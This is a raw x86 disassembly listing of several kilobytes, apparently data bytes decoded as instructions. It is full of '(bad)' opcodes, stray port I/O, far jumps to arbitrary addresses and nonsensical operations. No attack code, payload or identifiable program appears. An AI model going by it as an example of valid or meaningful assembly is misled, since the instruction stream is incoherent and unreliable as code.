  419adf:	pop    esp
  419ae0:	add    cl,ch
	...
  419b0a:	add    BYTE PTR [eax],al
  419b0c:	std    
  419b0d:	mov    al,ds:0xa821ed86
  419b12:	std    
  419b13:	add    BYTE PTR [edi],cl
  419b15:	pop    esp
  419b16:	add    BYTE PTR [eax],al
  419b18:	mov    fs,WORD PTR [esi]
  419b1a:	or     eax,0x895c1704
  419b1f:	xchg   bh,ch
  419b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b22:	std    
  419b23:	push   DWORD PTR [edi]
  419b25:	mov    esp,0xa7f7868a
  419b2a:	std    
  419b2b:	call   FWORD PTR [ebp-0x5e]
  419b2e:	pop    esi
  419b2f:	mov    bh,bl
  419b31:	pusha  
  419b32:	adc    DWORD PTR [eax],0xffffffeb
  419b35:	pop    ebx
  419b36:	add    BYTE PTR [esi-0x4e],bl
  419b39:	sbb    DWORD PTR ds:0x71615a00,eax
  419b3f:	mov    eax,0x1fe6754
  419b44:	xor    eax,eax
  419b46:	add    DWORD PTR [eax],eax
  419b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b49:	and    ch,BYTE PTR [eax+0x9]
  419b4c:	retf   0x8ab6
  419b4f:	xchg   BYTE PTR [edi+0xefffda7],ah
  419b55:	es adc eax,0x405ba704
  419b5b:	mov    DWORD PTR [ecx],eax
  419b5d:	rol    BYTE PTR [ecx],0x0
  419b60:	xchg   edi,eax
  419b61:	adc    DWORD PTR es:[eax],0x6b
  419b65:	pop    ebx
  419b66:	add    BYTE PTR [ebx+0x1b6d9],cl
  419b6c:	push   edi
  419b6d:	and    DWORD PTR ds:0x2,ecx
	...
  419b97:	add    BYTE PTR [eax],al
  419b99:	add    BYTE PTR [ebp+0x7788bf60],ah
  419b9f:	pop    esp
  419ba0:	mov    ds,WORD PTR [ebx+ebx*2]
  419ba3:	pop    ebx
  419ba4:	add    BYTE PTR [ebp+0x6e],dh
  419ba7:	and    al,BYTE PTR [ebx+0x5b5b10]
  419bad:	mov    DWORD PTR [ecx+0x270001b7],ebp
  419bb3:	fwait
  419bb4:	mov    BYTE PTR [esi-0x24fc2],ch
  419bba:	and    DWORD PTR [esi+edi*2],edi
  419bbd:	cmovb  esi,DWORD PTR [ecx+eax*1-0x2434775]
  419bc5:	dec    DWORD PTR [ecx]
  419bc7:	cmp    esi,esp
  419bc9:	add    esp,ebp
  419bcb:	ss inc edx
  419bcd:	xchg   DWORD PTR [esi-0x4d],ecx
  419bd0:	jae    0x419bed
  419bd2:	cmp    dh,BYTE PTR [ecx+eax*1+0x7e394775]
  419bd9:	(bad)  
  419bdc:	add    DWORD PTR [ecx-0x24340],ecx
  419be2:	shl    esp,1
  419be4:	jp     0x419b93
  419be6:	sub    bh,BYTE PTR [eax+0x3eb70001]
  419bec:	hlt    
  419bed:	add    edi,DWORD PTR [esi]
  419bef:	mov    ah,0x78
  419bf1:	test   DWORD PTR [esi-0x40],edx
  419bf4:	add    DWORD PTR [eax],eax
  419bf6:	mov    ah,0xbc
  419bf8:	dec    eax
  419bfa:	mov    al,ds:0xd67773
	...
  419c27:	add    BYTE PTR [ebp+0x47],bl
  419c2a:	jl     0x419c33
  419c2c:	in     al,dx
  419c2d:	sub    BYTE PTR [esi],dh
  419c2f:	out    0x67,eax
  419c31:	mov    al,0x4
  419c33:	(bad)  
  419c34:	mov    ch,0x7d
  419c36:	jg     0x419c17
  419c38:	inc    edx
  419c39:	fs ja  0x419c09
  419c3c:	data16 clc 
  419c3e:	add    eax,0x343969fe
  419c43:	sbb    BYTE PTR [edi-0x4e],0xb2
  419c47:	mov    cl,BYTE PTR [eax+0x51fb448c]
  419c4d:	in     eax,0x80
  419c4f:	out    0x3f,al
  419c51:	inc    ebp
  419c52:	ja     0x419c21
  419c54:	push   esi
  419c55:	xor    BYTE PTR ds:0x465b39fe,al
  419c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5c:	xchg   edx,eax
  419c5d:	cdq    
  419c5e:	out    dx,eax
  419c5f:	add    edi,DWORD PTR [ebp-0x4ffd696d]
  419c65:	inc    esi
  419c66:	jecxz  0x419c6b
  419c68:	fcom   DWORD PTR ds:[eax]
  419c6b:	sti    
  419c6c:	mov    al,BYTE PTR [edx+esi*2+0x7d]
  419c70:	cmp    DWORD PTR [edi-0x19],ebx
  419c73:	add    esi,DWORD PTR [edi-0x6003024]
  419c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c7b:	jp     0x419c20
  419c7d:	inc    esi
  419c7e:	jecxz  0x419c83
  419c80:	ds aam 0x6d
  419c83:	repz cmp eax,0xc378e75b
  419c89:	inc    edx
  419c8a:	jmp    0x419c8f
	...
  419cb4:	add    BYTE PTR [eax],al
  419cb6:	ds rcl edi,1
  419cb9:	add    esp,ebp
  419cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cbc:	sub    DWORD PTR [ebx+0x31],edi
  419cbf:	pop    esp
  419cc0:	pop    ebp
  419cc1:	out    0x3d,eax
  419cc3:	pop    ebx
  419cc4:	out    0x8e,eax
  419cc6:	push   esi
  419cc7:	shl    BYTE PTR [ebp-0xd],cl
  419cca:	cmp    eax,0xbb7ae75b
  419ccf:	inc    edx
  419cd0:	jecxz  0x419cd5
  419cd2:	sbb    esi,DWORD PTR ds:[eax+0x55]
  419cd6:	xor    eax,0xb703e75f
  419cdb:	(bad)  
  419cdd:	inc    DWORD PTR [ecx+0x517d62a5]
  419ce3:	pop    edi
  419ce4:	out    0x3,eax
  419ce6:	les    ecx,FWORD PTR [edx-0x17]
  419ce9:	aad    0x68
  419ceb:	cwde   
  419cec:	pop    edi
  419ced:	adc    al,0x61
  419cef:	xlat   BYTE PTR ds:[ebx]
  419cf0:	jmp    0x419cf9
  419cf2:	ds pop ebx
  419cf4:	cmp    al,0x1d
  419cf6:	(bad)  
  419cf7:	(bad)  
  419cf9:	pop    es
  419cfa:	ds pop ebx
  419cfc:	add    BYTE PTR [eax-0x4c],ah
  419cff:	inc    edx
  419d00:	add    al,0xe9
  419d02:	cmp    eax,0x5e57871b
  419d07:	pop    edi
  419d08:	add    cl,ch
  419d0a:	mov    edx,0x3ded10dd
  419d0f:	pop    ebx
  419d10:	mov    DWORD PTR [edi+0x3a],esp
  419d13:	pop    edi
  419d14:	add    cl,ch
  419d16:	ret    
  419d17:	dec    ebx
  419d18:	add    bl,BYTE PTR [ebx+0x0]
	...
  419d42:	add    BYTE PTR [eax],al
  419d44:	cmp    al,0x98
  419d46:	mov    cl,bl
  419d48:	cmp    dl,ch
  419d4a:	sbb    al,0xe5
  419d4c:	cmp    eax,0xc100735b
  419d51:	fst    QWORD PTR [eax]
  419d53:	in     eax,0x3d
  419d55:	pop    ebx
  419d56:	xchg   DWORD PTR [edi+0x42],ebp
  419d59:	pop    edi
  419d5a:	add    cl,ch
  419d5c:	jge    0x419d3a
  419d5e:	scas   al,BYTE PTR es:[edi]
  419d5f:	in     eax,0x39
  419d61:	pop    ebx
  419d62:	add    BYTE PTR [eax-0x4c],dh
  419d65:	dec    ebx
  419d66:	add    al,0xe9
  419d68:	cmp    eax,0x41d186d2
  419d6d:	pop    ebx
  419d6e:	add    BYTE PTR [ecx],bh
  419d70:	pop    edx
  419d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d72:	mov    edi,ebp
  419d74:	inc    ecx
  419d75:	pop    ebx
  419d76:	add    BYTE PTR [edx+eax*2+0x41f986d2],bl
  419d7d:	pop    ebx
  419d7e:	add    BYTE PTR [eax-0x3c],dh
  419d81:	inc    ebx
  419d82:	add    al,0xe9
  419d84:	cmp    eax,0x5e47871b
  419d89:	pop    edi
  419d8a:	add    cl,ch
  419d8c:	retf   0x10dd
  419d8f:	in     eax,dx
  419d90:	cmp    eax,0x4567895b
  419d95:	pop    edi
  419d96:	add    cl,ch
  419d98:	lea    edi,[ebx-0x1]
  419d9b:	pop    esi
  419d9c:	cmp    DWORD PTR [edi+0x0],ebx
  419d9f:	add    BYTE PTR [edi+0x23],ah
  419da2:	adc    eax,0x447e18b
	...
  419dcf:	add    BYTE PTR [eax],al
  419dd1:	add    BYTE PTR [edi-0x29],dl
  419dd4:	xchg   BYTE PTR [eax],bl
  419dd6:	and    ebx,DWORD PTR [eax+0x0]
  419dd9:	inc    eax
  419dda:	scas   al,BYTE PTR es:[edi]
  419ddb:	jmp    0x8685:0x5817041c
  419de2:	daa    
  419de3:	pop    esp
  419de4:	add    BYTE PTR [eax],al
  419de6:	pushf  
  419de7:	rcr    BYTE PTR [eax],cl
  419de9:	add    al,0x27
  419deb:	pop    eax
  419dec:	shl    BYTE PTR [eax],1
  419dee:	push   ss
  419def:	retf   0x41c
  419df2:	pop    ss
  419df3:	pop    eax
  419df4:	jno    0x419e0f
  419df6:	pop    esp
  419df7:	rcl    BYTE PTR [eax],cl
  419df9:	add    al,0xe7
  419dfb:	push   edi
  419dfc:	test   DWORD PTR [esi+0x533f],eax
  419e02:	xchg   edi,eax
  419e03:	(bad)  
  419e04:	scas   al,BYTE PTR es:[edi]
  419e05:	sbb    al,0xe3
  419e07:	push   edi
  419e08:	add    BYTE PTR [ecx+0x44861],cl
  419e0e:	xlat   BYTE PTR ds:[ebx]
  419e0f:	aam    0xb6
  419e11:	sbb    bl,dl
  419e13:	push   edi
  419e14:	add    al,dl
  419e16:	inc    ecx
  419e17:	cmp    DWORD PTR [ecx-0x3e],ebx
  419e1a:	scas   eax,DWORD PTR es:[edi]
  419e1b:	push   edi
  419e1c:	xchg   DWORD PTR [ebx+eax*4+0x5b],eax
  419e20:	push   esi
  419e21:	push   edi
  419e22:	sbb    al,0x24
  419e24:	and    al,0x10
  419e26:	sbb    al,0xaf
  419e28:	cmp    DWORD PTR [eax+0x730057a7],eax
  419e2e:	imul   ebx,esp,0xfffffffb
  419e31:	add    al,0x4
  419e33:	inc    ecx
  419e34:	aaa    
  419e35:	xchg   BYTE PTR [eax],al
	...
  419e5f:	add    BYTE PTR [ebx+0x1300005b],al
  419e65:	add    esi,ebx
  419e67:	fdivr  DWORD PTR [edi+ebx*4]
  419e6a:	jg     0x419e4c
  419e6c:	ds mov ah,0x60
  419e6f:	cmp    DWORD PTR [esi-0x42],0xb246c25f
  419e76:	cmp    al,0x86
  419e78:	and    bh,BYTE PTR [esi-0x5135ffff]
  419e7e:	cmp    BYTE PTR ds:[esi],0xb4
  419e82:	add    DWORD PTR [ecx+0x3b],esi
  419e85:	xor    eax,0xa51502ef
  419e8a:	add    BYTE PTR ds:[ebx],bh
  419e8d:	mov    ah,0x1
  419e8f:	jb     0x419ed0
  419e91:	inc    ecx
  419e92:	cmp    eax,0x1b49300
  419e97:	jb     0x419ed8
  419e99:	jno    0x419e5c
  419e9b:	call   0xc0c4e3d6
  419ea0:	cmp    eax,0xf426ec44
  419ea5:	cmp    edi,edi
  419ea7:	push   ebp
  419ea8:	mov    ch,0x72
  419eaa:	mov    ebx,eax
  419eac:	(bad)  
  419ead:	test   al,0xfb
  419eaf:	std    
  419eb0:	fcos   
  419eb2:	inc    edi
  419eb3:	sbb    BYTE PTR [ebp+edi*8+0x60],al
  419eb7:	pop    esi
  419eb8:	cld    
  419eb9:	lods   al,BYTE PTR ds:[esi]
  419eba:	add    DWORD PTR [ebp-0x2a],edx
  419ebd:	mov    eax,0xd1b9fdfb
  419ec2:	test   al,al
	...
  419eec:	add    BYTE PTR [eax],al
  419eee:	cmp    bl,BYTE PTR [edx-0x1ac1f73d]
  419ef4:	mov    WORD PTR [edx+ebx*2-0x44],ds
  419ef8:	push   esi
  419ef9:	push   esi
  419efa:	lds    eax,FWORD PTR [ebx-0x7d]
  419efd:	mov    esi,0x1b066
  419f02:	ds leave 
  419f04:	adc    BYTE PTR [ebp+eiz*1-0x40fffe4d],al
  419f0b:	lods   eax,DWORD PTR ds:[esi]
  419f0c:	add    DWORD PTR [eax],0x74e75b3e
  419f12:	sub    esi,ebx
  419f14:	pop    ebx
  419f15:	sub    BYTE PTR [esi+0x57],al
  419f18:	pop    edx
  419f19:	ds pushw 0xffd2
  419f1d:	add    BYTE PTR [eax-0x2a],dl
  419f20:	mov    ch,0xeb
  419f22:	push   cs
  419f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f24:	mov    esi,0xbf91b400
  419f29:	std    
  419f2a:	xor    al,0xa2
  419f2c:	scas   al,BYTE PTR es:[edi]
  419f2d:	lea    edi,[edx+0x77]
  419f30:	dec    DWORD PTR [eax+edx*8+0x3e03e34a]
  419f37:	aad    0xa2
  419f39:	daa    
  419f3a:	sbb    DWORD PTR [eax+eiz*4+0x5],ebx
  419f3e:	rol    DWORD PTR [ecx],1
  419f40:	outs   dx,DWORD PTR ds:[esi]
  419f41:	add    eax,0x7d7d90b
  419f46:	ds pop ebx
  419f48:	pusha  
  419f49:	mov    eax,ds:0x3e75722
  419f4e:	nop
  419f4f:	add    dl,al
  419f51:	lds    eax,FWORD PTR [eax]
	...
  419f7b:	add    BYTE PTR [esi],dh
  419f7d:	pop    ebx
  419f7e:	push   0xffffffd0
  419f80:	jecxz  0x419fdd
  419f82:	xchg   ebp,eax
  419f83:	pop    ds
  419f84:	inc    edx
  419f85:	pop    ebx
  419f86:	out    0x8e,eax
  419f88:	arpl   WORD PTR [esp+edi*4+0x1a],dx
  419f8c:	mov    bh,0xd8
  419f8e:	xlat   BYTE PTR ds:[ebx]
  419f8f:	pop    es
  419f90:	ds pop ebx
  419f92:	pusha  
  419f93:	mov    DWORD PTR [esi+0x57],edx
  419f96:	out    0x3,eax
  419f98:	(bad)  
  419f99:	rcl    DWORD PTR [ebp+0x1f],cl
  419f9c:	inc    edx
  419f9d:	pop    ebx
  419f9e:	out    0x8a,eax
  419fa0:	mov    eax,0x3e03eb4a
  419fa5:	(bad)  
  419fa6:	sbb    edi,DWORD PTR gs:[edx]
  419fa9:	pop    ebx
  419faa:	out    0x8d,eax
  419fac:	ss pop ebp
  419fae:	xor    BYTE PTR [ecx],al
  419fb0:	jle    0x419f84
  419fb2:	add    cl,ah
  419fb4:	cmp    al,0xe1
  419fb6:	sbb    al,0xe5
  419fb8:	cmp    eax,0xb500735b
  419fbd:	fcom   DWORD PTR [eax]
  419fbf:	in     eax,0x3d
  419fc1:	pop    ebx
  419fc2:	xchg   DWORD PTR [edi+0x3a],ebp
  419fc5:	push   edi
  419fc6:	add    cl,ch
  419fc8:	std    
  419fc9:	fldcw  WORD PTR [esi+0x5b41e5]
  419fcf:	jo     0x419f89
  419fd1:	dec    edx
  419fd2:	add    al,0xe9
  419fd4:	cmp    eax,0x39d186d2
  419fd9:	pop    ebx
  419fda:	add    BYTE PTR [ecx-0x572e2d9e],bh
	...
  41a008:	add    BYTE PTR [eax],al
  41a00a:	adc    al,0x54
  41a00c:	sub    DWORD PTR [ebx-0x6076f2c4],0x86fa9922
  41a016:	or     ebx,edx
  41a018:	xchg   cl,bl
  41a01a:	cmp    DWORD PTR [ebx+0x0],ebx
  41a01d:	popa   
  41a01e:	pop    edx
  41a01f:	jecxz  0x41a020
  41a021:	call   0x6f40fb63
  41a026:	push   edx
  41a027:	push   edi
  41a028:	add    cl,ch
  41a02a:	mov    dl,0xc1
  41a02c:	and    al,0xed
  41a02e:	cmp    eax,0xba527f5b
  41a033:	pop    ebx
  41a034:	add    cl,ch
  41a036:	dec    esp
  41a037:	inc    ebx
  41a038:	or     ebp,0x62024319
  41a03e:	push   cs
  41a03f:	ja     0x41a059
  41a041:	cwde   
  41a042:	les    edx,FWORD PTR [ecx-0x615b8118]
  41a048:	std    
  41a049:	mov    esi,0x2b590403
  41a04e:	dec    edx
  41a04f:	pop    ebx
  41a050:	jg     0x41a064
  41a052:	cmp    bl,BYTE PTR [eax+eax*1+0x0]
  41a056:	xchg   edi,eax
  41a057:	sub    al,BYTE PTR [ecx+ebp*1]
  41a05a:	fstp   TBYTE PTR [eax+0x18]
  41a05d:	sub    DWORD PTR [esp+ebx*2+0x79],0x42a6700
  41a065:	sub    DWORD PTR [ebx],ebx
  41a067:	jae    0x41a081
  41a069:	mov    edx,DWORD PTR [ebx]
  41a06b:	jae    0x41a085
  41a06d:	push   ecx
	...
  41a096:	add    BYTE PTR [eax],al
  41a098:	fmul   QWORD PTR [ebp-0x5e929318]
  41a09e:	sti    
  41a09f:	pop    edi
  41a0a0:	and    DWORD PTR [edx],edi
  41a0a2:	push   edi
  41a0a3:	ret    0x5c4f
  41a0a6:	ret    
  41a0a7:	xchg   BYTE PTR [edi],bh
  41a0a9:	push   ebx
  41a0aa:	add    BYTE PTR [eax],al
  41a0ac:	es pop esp
  41a0ae:	add    BYTE PTR [eax],al
  41a0b0:	xchg   esi,eax
  41a0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b2:	add    BYTE PTR [eax],0x17
  41a0b5:	pop    esp
  41a0b6:	outs   dx,DWORD PTR ds:[esi]
  41a0b7:	dec    ecx
  41a0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0b9:	and    BYTE PTR [eax+ebx*1],ah
  41a0bc:	sbb    ebp,DWORD PTR ds:0x78a13b42
  41a0c2:	add    al,0x0
  41a0c4:	pop    ss
  41a0c5:	sub    BYTE PTR [edx],bh
  41a0c7:	call   0x3d42a9
  41a0cc:	pop    esp
  41a0cd:	mov    gs,eax
  41a0cf:	add    ebx,DWORD PTR [ebp-0x5f]
  41a0d2:	sti    
  41a0d3:	mov    edx,DWORD PTR [ecx]
  41a0d5:	mov    ah,0xc9
  41a0d7:	stc    
  41a0d8:	jo     0x41a07b
  41a0da:	mov    al,BYTE PTR [ebx+edi*1+0x3f]
  41a0de:	xchg   DWORD PTR [esi+0x57e7],ecx
  41a0e4:	dec    ebp
  41a0e5:	lea    esp,[ecx+eax*1]
  41a0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e9:	mov    DWORD PTR [edx],eax
  41a0eb:	ret    0xd3c0
  41a0ee:	std    
  41a0ef:	(bad)  
  41a0f0:	sbb    DWORD PTR [esp+eax*1+0x0],ecx
  41a0f4:	xchg   edi,eax
  41a0f5:	into   
  41a0f6:	sahf   
  41a0f7:	and    al,0x3e
  41a0f9:	scas   al,BYTE PTR es:[edi]
  41a0fa:	add    DWORD PTR [eax],eax
	...
  41a124:	add    BYTE PTR [eax],al
  41a126:	lock out dx,al
  41a128:	pop    edx
  41a129:	ret    0xb236
  41a12c:	or     ch,0x81
  41a12f:	mov    dl,0xbb
  41a131:	sbb    al,0x42
  41a133:	mov    dl,0x1
  41a135:	mov    esp,ecx
  41a137:	mov    edx,0x2fb51778
  41a13c:	adc    al,0x4
  41a13e:	ds mov dl,0x8a
  41a141:	xchg   BYTE PTR [esi],dh
  41a143:	scas   al,BYTE PTR es:[edi]
  41a144:	add    DWORD PTR [eax],eax
  41a146:	(bad)  
  41a147:	cmp    ch,BYTE PTR [esi+0x1b2421c]
  41a14d:	xchg   DWORD PTR [eax+0x3e000581],edi
  41a153:	cmp    DWORD PTR [esi+0x1b43a18],eax
  41a159:	mov    cl,BYTE PTR [esi-0x4e]
  41a15c:	iret   
  41a15d:	(bad)  
  41a15e:	cld    
  41a15f:	sub    al,0x14
  41a161:	(bad)  
  41a162:	fld    TBYTE PTR [eax+0x473e0005]
  41a168:	sbb    DWORD PTR [ecx+0x584c0],ecx
  41a16e:	sub    eax,DWORD PTR ds:[esi+0x1b44218]
  41a175:	inc    eax
  41a176:	(bad)  
  41a177:	pop    esi
  41a178:	and    BYTE PTR [esi+edi*1],al
  41a17b:	mov    ah,0x8a
  41a17d:	xchg   BYTE PTR [esi-0x48],cl
  41a180:	add    DWORD PTR [eax],eax
  41a182:	lds    ebp,FWORD PTR [esi]
  41a184:	sbb    al,0x4
  41a186:	ds mov ah,0xd1
  41a189:	and    BYTE PTR [eax],al
	...
  41a1b3:	add    BYTE PTR ds:0x3e042836,al
  41a1b9:	mov    ah,0x75
  41a1bb:	jb     0x41a182
  41a1bd:	jno    0x41a180
  41a1bf:	call   0x205d30a
  41a1c4:	push   cs
  41a1c5:	pop    ebx
  41a1c6:	setbe  BYTE PTR [ecx-0x3776e162]
  41a1cd:	dec    ebx
  41a1ce:	jmp    0x41a1d3
  41a1d0:	ds shl eax,cl
  41a1d3:	mov    ebx,0x3e79e89
  41a1d8:	sbb    eax,0x5b3e07d7
  41a1de:	pusha  
  41a1df:	sahf   
  41a1e0:	sbb    dl,BYTE PTR [edi-0x19]
  41a1e3:	add    ebp,ecx
  41a1e5:	mov    eax,ds:0x5b3e0367
  41a1ea:	pop    edx
  41a1eb:	sbb    al,0xbf
  41a1ed:	das    
  41a1ee:	or     ebx,DWORD PTR [esp+edi*1]
  41a1f1:	shl    BYTE PTR [ebx],cl
  41a1f3:	sub    BYTE PTR [esi],ah
  41a1f5:	or     DWORD PTR [edx-0x33],esi
  41a1f8:	push   esi
  41a1f9:	aaa    
  41a1fa:	sar    ah,0x3b
  41a1fd:	(bad)  
  41a1fe:	adc    al,0x5f
  41a200:	xchg   edi,eax
  41a201:	cdq    
  41a202:	fild   WORD PTR [ebx]
  41a204:	test   eax,0x3e06e7a2
  41a209:	pop    ebx
  41a20a:	sbb    DWORD PTR [eax],ecx
  41a20c:	popa   
  41a20d:	pop    ss
  41a20e:	retf   
  41a20f:	sbb    edx,DWORD PTR [ecx+0x3e7ee7a2]
  41a215:	pop    ebx
  41a216:	stc    
  41a217:	push   0x0
	...
  41a241:	add    BYTE PTR [ecx+0x17],bl
  41a244:	ret    
  41a245:	sbb    eax,edi
  41a247:	push   es
  41a248:	retf   
  41a249:	sbb    ecx,DWORD PTR [edx+edx*8-0x5bce1463]
  41a250:	data16 cld 
  41a252:	cmp    ebp,0xffffffbb
  41a255:	pop    eax
  41a256:	cld    
  41a257:	push   edx
  41a258:	out    0x2,eax
  41a25a:	nop
  41a25b:	ds jecxz 0x41a261
  41a25e:	ds sub al,ah
  41a261:	mov    BYTE PTR [eax+0x3e03e34a],bh
  41a267:	aam    0x0
  41a269:	outs   dx,DWORD PTR ds:[esi]
  41a26a:	push   ebp
  41a26b:	push   edi
  41a26c:	add    cl,ch
  41a26e:	std    
  41a26f:	aad    0xae
  41a271:	add    eax,0x70005b36
  41a276:	ret    
  41a277:	dec    edx
  41a278:	add    al,0xe9
  41a27a:	cmp    eax,0x41f186d4
  41a27f:	pop    ebx
  41a280:	add    BYTE PTR [ecx],bl
  41a282:	pop    ebp
  41a283:	sahf   
  41a284:	mov    ebx,0x5b41dd
  41a289:	jl     0x41a2df
  41a28b:	aam    0x86
  41a28d:	fld    DWORD PTR [ecx+0x5b]
  41a290:	add    BYTE PTR [eax-0x44],dh
  41a293:	inc    edx
  41a294:	add    al,0xe9
  41a296:	cmp    eax,0x3687871b
  41a29b:	push   edi
  41a29c:	add    cl,ch
  41a29e:	mov    edx,0x3ded10d4
  41a2a3:	pop    ebx
  41a2a4:	mov    DWORD PTR [edi+0x0],esp
	...
  41a2cf:	add    BYTE PTR [edx+0x57],bl
  41a2d2:	add    cl,ch
  41a2d4:	or     eax,0x5e15897c
  41a2d9:	inc    ebx
  41a2da:	push   edx
  41a2db:	jb     0x41a2d1
  41a2dd:	mov    bl,0xd4
  41a2df:	mov    eax,ds:0x375d9f15
  41a2e4:	ja     0x41a2e8
  41a2e6:	ret    0x3de1
  41a2e9:	rol    BYTE PTR [ebp+ecx*8+0x1],cl
  41a2ed:	rcl    BYTE PTR [eax-0x2639a17],cl
  41a2f3:	mov    dl,0xca
  41a2f5:	push   edi
  41a2f6:	add    al,0xe9
  41a2f8:	cmp    eax,0xb3721725
  41a2fd:	dec    edi
  41a2fe:	add    al,0xe9
  41a300:	cmp    eax,0x3edfbf62
  41a305:	jb     0x41a2c6
  41a307:	sub    edi,DWORD PTR [esi]
  41a309:	pop    ebx
  41a30a:	sub    DWORD PTR [eax],eax
  41a30c:	push   ss
  41a30d:	pop    edx
  41a30e:	add    BYTE PTR [eax-0x5a],ch
  41a311:	pop    eax
  41a312:	ret    0xa704
  41a315:	gs rol dl,0xa3
  41a319:	pop    eax
  41a31a:	jg     0x41a308
  41a31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a31d:	add    eax,0x3ccb8b51
  41a322:	and    BYTE PTR [esi+0x74],dl
  41a325:	jge    0x41a2ae
  41a327:	icebp  
  41a328:	ror    bh,1
  41a32a:	pop    esp
  41a32b:	and    al,0x67
  41a32d:	iret   
  41a32e:	pop    esp
  41a32f:	and    al,0x5f
  41a331:	pop    edi
  41a332:	scas   al,BYTE PTR es:[edi]
  41a333:	or     BYTE PTR [eax],al
	...
  41a35d:	add    BYTE PTR [ebx+0x58],ah
  41a360:	add    BYTE PTR [edi],cl
  41a362:	aam    0xf3
  41a364:	add    BYTE PTR [eax],al
  41a366:	push   edi
  41a367:	lods   eax,DWORD PTR ds:[esi]
  41a368:	pop    es
  41a369:	(bad)  
  41a36a:	ret    
  41a36b:	cmp    al,0x0
  41a36d:	add    BYTE PTR [edi+0x58],ah
  41a370:	mov    DWORD PTR [ebx+eax*2+0x57],esp
  41a374:	xchg   DWORD PTR [esi-0x263ad],eax
  41a37a:	stos   BYTE PTR es:[edi],al
  41a37b:	rol    BYTE PTR [eax],1
  41a37d:	push   0xc8375826
  41a382:	jno    0x41a3cc
  41a384:	xchg   DWORD PTR [esi-0x263d5],ecx
  41a38a:	sbb    al,0x97
  41a38c:	jbe    0x41a392
  41a38e:	cld    
  41a38f:	xchg   esi,eax
  41a390:	out    0xb,eax
  41a392:	cld    
  41a393:	xchg   esi,eax
  41a394:	add    DWORD PTR [eax],eax
  41a396:	das    
  41a397:	push   esi
  41a398:	add    bl,ch
  41a39a:	in     eax,0x64
  41a39c:	ror    BYTE PTR [ebx+0x45059],0xd7
  41a3a3:	push   eax
  41a3a4:	mov    dh,0x11
  41a3a6:	call   0x4c42e994
  41a3ab:	or     al,0x96
  41a3ad:	add    al,0x3e
  41a3af:	cmp    DWORD PTR ds:0x8b4bb58a,eax
  41a3b5:	or     al,0xb9
  41a3b7:	sub    BYTE PTR [edi+0x8],bh
  41a3ba:	inc    edx
  41a3bb:	mov    dl,0x1
  41a3bd:	or     eax,0xb60a81e8
	...
  41a3ea:	add    BYTE PTR [eax],al
  41a3ec:	(bad)  
  41a3ed:	mov    dl,0x8e
  41a3ef:	dec    esp
  41a3f0:	enter  0x8ead,0x96
  41a3f4:	inc    edx
  41a3f5:	mov    dh,0x1
  41a3f7:	add    bh,al
  41a3f9:	popf   
  41a3fa:	test   BYTE PTR [edi+0x1b23f],dh
  41a400:	aas    
  41a401:	and    al,0xfd
  41a403:	add    edi,DWORD PTR [esi]
  41a405:	mov    dl,0x4
  41a407:	mov    es,WORD PTR [esi-0x52]
  41a40a:	add    DWORD PTR [eax],eax
  41a40c:	mov    ch,0x33
  41a40e:	std    
  41a40f:	add    edi,DWORD PTR [esi]
  41a411:	mov    dl,0x8c
  41a413:	enter  0x2c25,0x8
  41a417:	add    al,0x3e
  41a419:	mov    dl,0x82
  41a41b:	idiv   DWORD PTR [esi]
  41a41d:	sbb    al,BYTE PTR [ecx]
  41a41f:	add    al,cl
  41a421:	lods   al,BYTE PTR ds:[esi]
  41a422:	dec    ecx
  41a423:	xchg   eax,eax
  41a425:	mov    ch,bh
  41a427:	push   DWORD PTR [ecx]
  41a429:	mov    WORD PTR [edi+0x1844208],fs
  41a42f:	or     eax,0xfdf76ebc
  41a434:	sbb    DWORD PTR [esi],ecx
  41a436:	inc    eax
  41a437:	and    al,0x4e
  41a439:	cs add al,0x65
  41a43c:	aas    
  41a43d:	test   BYTE PTR [edx+eax*8],bh
  41a440:	mov    BYTE PTR [edx-0x2bddab76],cl
  41a446:	in     al,dx
  41a447:	pop    es
  41a448:	mov    ebp,0xc00d010c
  41a44d:	mov    esi,0x1
	...
  41a47a:	ds pop ebx
  41a47c:	div    BYTE PTR [ecx-0x4e11a483]
  41a482:	test   DWORD PTR [edx+eiz*2+0x40],ebx
  41a486:	rcr    BYTE PTR [edi+0x62],0x38
  41a48a:	mov    dh,0x56
  41a48c:	inc    edx
  41a48d:	or     edx,eax
  41a48f:	into   
  41a490:	call   0x6627e298
  41a495:	and    al,0x42
  41a497:	pop    ebx
  41a498:	out    0x86,eax
  41a49a:	cmp    ch,BYTE PTR [edx+0x2e]
  41a49d:	inc    eax
  41a49e:	bound  esi,QWORD PTR [edi-0x19]
  41a4a1:	or     edi,DWORD PTR [esi]
  41a4a3:	pop    ebx
  41a4a4:	sar    BYTE PTR [esi-0x69daaf4],cl
  41a4aa:	inc    edi
  41a4ab:	xchg   esi,eax
  41a4ac:	jnp    0x41a4dd
  41a4ae:	(bad)
  41a4b1:	imul   esi,DWORD PTR [ecx-0x66],0xffffffb2
  41a4b5:	add    DWORD PTR [edx+0x5f],0x72e803e7
  41a4bc:	jb     0x41a43f
  41a4be:	dec    edx
  41a4bf:	pop    edi
  41a4c0:	out    0x3,eax
  41a4c2:	pop    ss
  41a4c3:	xchg   ebx,eax
  41a4c4:	pop    ebp
  41a4c5:	add    BYTE PTR [edi],dl
  41a4c7:	xchg   ebx,eax
  41a4c8:	ret    0x1707
  41a4cb:	xchg   ebx,eax
  41a4cc:	push   0xe8033ec0
  41a4d1:	add    esp,DWORD PTR [edi]
  41a4d3:	pop    ebp
  41a4d4:	cli    
  41a4d5:	clc    
  41a4d6:	mov    bh,0x60
  41a4d8:	bound  esi,QWORD PTR [edi]
  41a4da:	out    0xe7,al
  41a4dc:	jmp    0x41a4e6
	...
  41a506:	add    BYTE PTR [eax],al
  41a508:	push   edi
